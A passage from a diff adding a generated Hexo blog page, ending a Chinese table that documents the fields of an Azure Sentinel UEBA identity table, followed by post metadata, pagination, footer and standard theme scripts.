+<td><strong>GroupMembership</strong></td>
+<td>动态</td>
+<td>用户帐户所归属的 Azure AD 组。</td>
+</tr>
+<tr>
+<td><strong>IsAccountEnabled</strong></td>
+<td>bool</td>
+<td>指示是否在 Azure AD 中启用了用户帐户。</td>
+</tr>
+<tr>
+<td><strong>JobTitle</strong></td>
+<td>string</td>
+<td>用户帐户的职务。</td>
+</tr>
+<tr>
+<td><strong>MailAddress</strong></td>
+<td>string</td>
+<td>用户帐户的主要电子邮件地址。</td>
+</tr>
+<tr>
+<td>管理员</td>
+<td>string</td>
+<td>用户帐户的管理员别名。</td>
+</tr>
+<tr>
+<td><strong>OnPremisesDistinguishedName</strong></td>
+<td>string</td>
+<td>Azure AD 可分辨名称 (DN)。专有名称是一系列相对专有名称 (RDN)，由逗号连接。</td>
+</tr>
+<tr>
+<td><strong>电话</strong></td>
+<td>string</td>
+<td>用户帐户的电话号码。</td>
+</tr>
+<tr>
+<td><strong>SourceSystem</strong></td>
+<td>string</td>
+<td>用户数据的来源系统。</td>
+</tr>
+<tr>
+<td><strong>State</strong></td>
+<td>string</td>
+<td>用户帐户的地理状态。</td>
+</tr>
+<tr>
+<td><strong>StreetAddress</strong></td>
+<td>string</td>
+<td>用户帐户的办公街道地址。</td>
+</tr>
+<tr>
+<td><strong>Surname</strong></td>
+<td>string</td>
+<td>用户的姓氏。帐户。</td>
+</tr>
+<tr>
+<td><strong>TenantId</strong></td>
+<td>string</td>
+<td>用户的租户 ID。</td>
+</tr>
+<tr>
+<td><strong>TimeGenerated</strong></td>
+<td>datetime</td>
+<td>生成事件的时间 (UTC)。</td>
+</tr>
+<tr>
+<td><strong>类型</strong></td>
+<td>string</td>
+<td>表的名称。</td>
+</tr>
+<tr>
+<td><strong>UserState</strong></td>
+<td>string</td>
+<td>Azure AD 中用户帐户的当前状态（活动/禁用/休眠/锁定）。</td>
+</tr>
+<tr>
+<td><strong>UserStateChangedOn</strong></td>
+<td>datetime</td>
+<td>上次更改帐户状态的日期 (UTC)。</td>
+</tr>
+<tr>
+<td><strong>UserType</strong></td>
+<td>string</td>
+<td>用户类型。</td>
+</tr>
+</tbody></table>
+
+                </div>
+
+                <div class="home-article-meta-info-container">
+    <div class="home-article-meta-info">
+        <span><i class="fas fa-history"></i>&nbsp;<span class="home-article-date" data-date="Sat May 01 2021 21:00:00 GMT+0800">2021-05-01</span></span>
+        
+            <span class="home-article-category"><i class="fas fa-folder"></i>&nbsp;
+                <ul>
+                    
+                        <li>
+                            
+                            <a href="/categories/%E5%AE%89%E5%85%A8%E6%95%B0%E6%8D%AE%E5%88%86%E6%9E%90/">安全数据分析</a>&nbsp;
+                        </li>
+                    
+                    
+                </ul>
+            </span>
+        
+        
+            <span class="home-article-tag">
+                <i class="fas fa-tags"></i>&nbsp;
+                <ul>
+                    
+                        <li>
+                            
+                            <a href="/tags/UEBA/">UEBA</a>&nbsp;
+                        </li>
+                    
+                </ul>
+            </span>
+        
+    </div>
+
+    <a href="/Azure%20Sentinel%20webinar:%20Enabling%20User%20and%20Entity%20Behavior%20Analytics%20(UEBA)/">Read more&nbsp;<i class="fas fa-angle-right"></i></a>
+</div>
+
+            </li>
+        
+    </ul>
+
+    <div class="home-paginator">
+        <div class="paginator">
+    
+        <a class="prev btn"
+           href="/page/4/"
+        >Prev</a>
+    
+
+    
+        <a class="next btn"
+           href="/page/6/"
+        >Next</a>
+    
+</div>
+
+    </div>
+</div>
+
+
+                
+            </div>
+
+        </div>
+
+        <div class="page-main-content-bottom">
+            <footer class="footer">
+    <div class="info-container">
+        <div class="copyright-info info-item">
+            &copy;
+            
+              <span>2016</span>&nbsp;-&nbsp;
+            
+            2024&nbsp;<i class="fas fa-heart icon-animate"></i>&nbsp;<a target="_blank" rel="noopener" href="//langu.xyz">AboutME:langu_xyz</a>
+        </div>
+        <!--
+            <script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+            <div class="website-count info-item">
+                
+                    <span id="busuanzi_container_site_uv">
+                        Visitor Count&nbsp;<span id="busuanzi_value_site_uv"></span>&ensp;
+                    </span>
+                
+                
+                    <span id="busuanzi_container_site_pv">
+                        Totalview&nbsp;<span id="busuanzi_value_site_pv"></span>
+                    </span>
+                
+            </div>
+        -->
+        <div class="theme-info info-item">
+            Powered by <a target="_blank" href="https://hexo.io">Hexo</a>&nbsp;|&nbsp;Theme&nbsp;<a class="theme-version" target="_blank" href="https://github.com/XPoet/hexo-theme-keep">Keep v3.4.3</a>
+        </div>
+        
+    </div>
+</footer>
+
+        </div>
+    </div>
+
+    
+
+    <div class="right-bottom-side-tools">
+        <div class="side-tools-container">
+    <ul class="side-tools-list">
+        <li class="tools-item tool-font-adjust-plus flex-center">
+            <i class="fas fa-search-plus"></i>
+        </li>
+
+        <li class="tools-item tool-font-adjust-minus flex-center">
+            <i class="fas fa-search-minus"></i>
+        </li>
+
+        <li class="tools-item tool-expand-width flex-center">
+            <i class="fas fa-arrows-alt-h"></i>
+        </li>
+
+        <li class="tools-item tool-dark-light-toggle flex-center">
+            <i class="fas fa-moon"></i>
+        </li>
+
+        <!-- rss -->
+        
+            <li class="tools-item rss flex-center">
+                <a class="flex-center"
+                   href="/atom.xml"
+                   target="_blank"
+                >
+                    <i class="fas fa-rss"></i>
+                </a>
+            </li>
+        
+
+        
+            <li class="tools-item tool-scroll-to-top flex-center">
+                <i class="fas fa-arrow-up"></i>
+            </li>
+        
+
+        <li class="tools-item tool-scroll-to-bottom flex-center">
+            <i class="fas fa-arrow-down"></i>
+        </li>
+    </ul>
+
+    <ul class="exposed-tools-list">
+        <li class="tools-item tool-toggle-show flex-center">
+            <i class="fas fa-cog fa-spin"></i>
+        </li>
+        
+    </ul>
+</div>
+
+    </div>
+
+    
+
+    <div class="image-viewer-container">
+    <img src="">
+</div>
+
+
+    
+        <div class="search-pop-overlay">
+    <div class="popup search-popup">
+        <div class="search-header">
+          <span class="search-input-field-pre">
+            <i class="fas fa-keyboard"></i>
+          </span>
+            <div class="search-input-container">
+                <input autocomplete="off"
+                       autocorrect="off"
+                       autocapitalize="off"
+                       placeholder="Search..."
+                       spellcheck="false"
+                       type="search"
+                       class="search-input"
+                >
+            </div>
+            <span class="popup-btn-close">
+                <i class="fas fa-times"></i>
+            </span>
+        </div>
+        <div id="search-result">
+            <div id="no-result">
+                <i class="fas fa-spinner fa-pulse fa-5x fa-fw"></i>
+            </div>
+        </div>
+    </div>
+</div>
+
+    
+
+</main>
+
+
+
+
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/main.js"></script>
+
+<script src="/js/header-shrink.js"></script>
+
+<script src="/js/back2top.js"></script>
+
+<script src="/js/dark-light-toggle.js"></script>
+
+
+
+    
+<script src="/js/local-search.js"></script>
+
+
+
+
+    
+<script src="/js/code-copy.js"></script>
+
+
+
+
+    
+<script src="/js/lazyload.js"></script>
+
+
+
+<div class="post-scripts pjax">
+    
+</div>
+
+
+    
+<script src="/js/libs/pjax.min.js"></script>
+
+<script>
+    window.addEventListener('DOMContentLoaded', () => {
+        window.pjax = new Pjax({
+            selectors: [
+                'head title',
+                '.page-container',
+                '.pjax'
+            ],
+            history: true,
+            debug: false,
+            cacheBust: false,
+            timeout: 0,
+            analytics: false,
+            currentUrlFullReload: false,
+            scrollRestoration: false,
+            // scrollTo: true,
+        });
+
+        document.addEventListener('pjax:send', () => {
+            KEEP.utils.pjaxProgressBarStart();
+        });
+
+        document.addEventListener('pjax:complete', () => {
+            KEEP.utils.pjaxProgressBarEnd();
+            window.pjax.executeScripts(document.querySelectorAll('script[data-pjax], .pjax script'));
+            KEEP.refresh();
+        });
+    });
+</script>
+
+
+
+</body>
+</html>
